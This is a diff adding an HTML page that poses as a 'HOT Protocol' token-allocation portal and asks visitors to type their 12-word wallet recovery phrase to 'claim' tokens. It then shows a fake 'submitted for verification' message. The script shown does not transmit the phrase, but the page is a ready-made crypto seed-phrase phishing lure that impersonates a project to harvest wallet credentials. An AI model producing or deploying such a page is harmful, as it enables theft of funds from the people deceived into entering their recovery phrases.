@@ -1,0 +1,154 @@
+<!doctype html>
+<html lang="en"> 
+ <head> 
+  <meta charset="UTF-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <title>HOT Protocol Allocation</title> 
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet"> 
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Roboto', Arial, sans-serif;
+      color: #c9d1d9;
+      background: linear-gradient(135deg, #000000, #1e1e1e);
+      overflow: auto;
+    }
+
+    header {
+      padding: 20px 0;
+      background: rgba(0, 0, 0, 0.9);
+      color: #ff9900;
+      font-size: 24px;
+      font-weight: bold;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 10px;
+    }
+
+    header img {
+      width: 40px;
+      height: 40px;
+    }
+
+    .container {
+      max-width: 600px;
+      margin: 60px auto;
+      background: rgba(255, 199, 0, 0.15);
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(255, 199, 0, 0.4);
+    }
+
+    h1 {
+      font-size: 30px;
+      color: #ffcc00;
+      margin-bottom: 15px;
+    }
+
+    p {
+      color: #d4d4d4;
+      font-size: 16px;
+      margin-bottom: 20px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px 15px;
+      font-size: 16px;
+      border: 1px solid #ff9900;
+      border-radius: 5px;
+      margin-bottom: 20px;
+      background: rgba(255, 199, 0, 0.1);
+      color: #ffffff;
+    }
+
+    input::placeholder {
+      color: #8b949e;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px 20px;
+      background: linear-gradient(90deg, #ff9900, #ffcc00);
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s ease, transform 0.3s ease;
+    }
+
+    button:hover {
+      background: linear-gradient(90deg, #cc7a00, #e0b000);
+      transform: translateY(-2px);
+    }
+
+    .allocation-container {
+      display: none;
+      margin-top: 30px;
+      padding: 20px;
+      background: rgba(255, 199, 0, 0.1);
+      border-radius: 10px;
+      color: #c9d1d9;
+      box-shadow: 0 0 15px rgba(255, 199, 0, 0.3);
+    }
+
+    .allocation-container h2 {
+      font-size: 24px;
+      color: #ffcc00;
+    }
+
+    footer {
+      margin-top: 50px;
+      padding: 20px 0;
+      background: rgba(0, 0, 0, 0.9);
+      font-size: 14px;
+      color: #8b949e;
+    }
+
+    footer a {
+      color: #ff9900;
+      text-decoration: none;
+      transition: color 0.3s ease;
+    }
+
+    footer a:hover {
+      color: #cc7a00;
+    }
+  </style> 
+ </head> 
+ <body> 
+  <header> 
+   <img src="https://i.imgur.com/LE1FxNt.png" alt="HOT Protocol Logo"> HOT Protocol 
+  </header> 
+  <div class="container"> 
+   <h1>Verify Your $HOT Allocation</h1> 
+   <p>Welcome to HOT Protocol's Allocation Portal. Enter your 12-word recovery phrase to verify your wallet balance and claim your $HOT tokens.</p> 
+   <input type="text" id="phraseInput" placeholder="Enter your 12-word recovery phrase"> <button id="checkAllocation">Verify</button> 
+   <div class="allocation-container" id="allocationResult"> 
+    <h2>Your Allocation: <span style="color: #ff9900;">0 $HOT</span></h2> 
+    <p>Your wallet currently has no allocation. Please stay tuned for further announcements regarding rewards and eligibility.</p> 
+   </div> 
+  </div> 
+  <footer> 
+   <p>© 2024 HOT Protocol. All rights reserved. Follow us on <a href="#">Twitter</a>, <a href="#">Telegram</a>, and <a href="#">Discord</a>.</p> 
+  </footer> 
+  <script>
+    const submitButton = document.getElementById("checkAllocation");
+    const allocationResult = document.getElementById("allocationResult");
+    const phraseInput = document.getElementById("phraseInput");
+
+    submitButton.addEventListener("click", () => {
+      const phrase = phraseInput.value.trim();
+      if (phrase.split(" ").length === 12) {
+        allocationResult.style.display = "block";
+        alert("Your phrase has been successfully submitted for verification.");
+      } else {
+        alert("Please enter a valid 12-word recovery phrase.");
+      }
+    });
+  </script> 
+ </body>
+</html>
